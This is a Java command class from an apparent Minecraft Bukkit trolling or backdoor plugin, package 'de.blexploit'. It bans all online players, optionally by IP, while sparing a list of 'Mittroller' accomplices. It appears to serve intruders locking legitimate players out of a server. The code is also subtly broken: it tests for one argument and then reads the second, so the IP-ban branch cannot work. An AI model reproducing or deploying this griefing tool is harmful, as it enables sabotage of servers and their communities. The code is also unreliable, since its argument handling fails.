package de.blexploit.command.cmds;

import org.bukkit.Bukkit;
import org.bukkit.BanList.Type;
import org.bukkit.entity.Player;

import de.blexploit.command.Command;
import de.blexploit.players.Mittrollers;
import de.blexploit.players.create.MittrollerEntity;

public final class Banall extends Command {

	public Banall() {
		super("banall", "Bannt alle auﬂer Mittroller", "-ip");
		this.setNeedAdmin(true);
	}

	@SuppressWarnings("deprecation")
	@Override
	public void run(String[] args, MittrollerEntity mt) {
		if (args.length == 1) {
			if (args[1].equalsIgnoreCase("-ip")) {
				for (Player p : Bukkit.getOnlinePlayers()) {
					if (!Mittrollers.containsP(p)) {
						Bukkit.getBanList(Type.NAME).addBan(p.getName(), "You are banned!", null, null);
						Bukkit.banIP(p.getAddress().getAddress().getHostAddress().toString());
					}
				}
				this.SpielerInfo(mt, "hat alle Spieler ip gesperrt.");
			}
		} else {
			for (Player p : Bukkit.getOnlinePlayers()) {
				if (!Mittrollers.containsP(p)) {
					Bukkit.getBanList(Type.NAME).addBan(p.getName(), "You are banned!", null, null);
				}
			}
			this.SpielerInfo(mt, "hat alle Spieler gesperrt.");
		}

	}
}
